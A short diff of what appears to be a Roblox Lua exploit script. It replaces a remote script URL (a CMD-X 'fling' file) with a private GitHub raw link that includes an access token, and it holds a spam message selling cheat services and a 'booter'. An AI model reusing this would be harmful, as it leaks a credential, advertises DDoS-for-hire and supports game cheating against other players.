@@ -1,4 +1,4 @@
-local paste = "https://raw.githubusercontent.com/CMD-X/CMD-X/master/projetcs/InGameFlingForTB"
+local paste = "https://raw.githubusercontent.com/PrimeYuki/primeyukibot/main/upladthisnext.txt?token=AVCOOBM2JY3DK4ZGG4REAMLBBGJV2"
 local message = "yukiW0001 to buy prime services,best roblox, COD, R6, FIVEM, DVR(minecraft), booter"
 if not game:IsLoaded() then game.Loaded:wait() end
 
